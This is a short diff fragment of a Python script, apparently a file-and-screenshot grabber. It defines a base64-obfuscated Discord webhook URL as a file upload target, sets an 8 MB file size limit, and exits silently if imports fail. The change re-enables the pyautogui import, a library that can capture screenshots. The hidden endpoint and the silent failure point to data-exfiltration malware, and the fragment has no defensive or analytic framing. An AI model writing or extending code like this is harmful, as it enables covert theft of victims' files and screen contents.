@@ -10,7 +10,7 @@ FILE_WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNDUzNDE5ODU0
 MAX_FILE_SIZE = 8 * 1024 * 1024
 
 try:
-    # import pyautogui
+    import pyautogui
     import requests
 except:
     sys.exit()
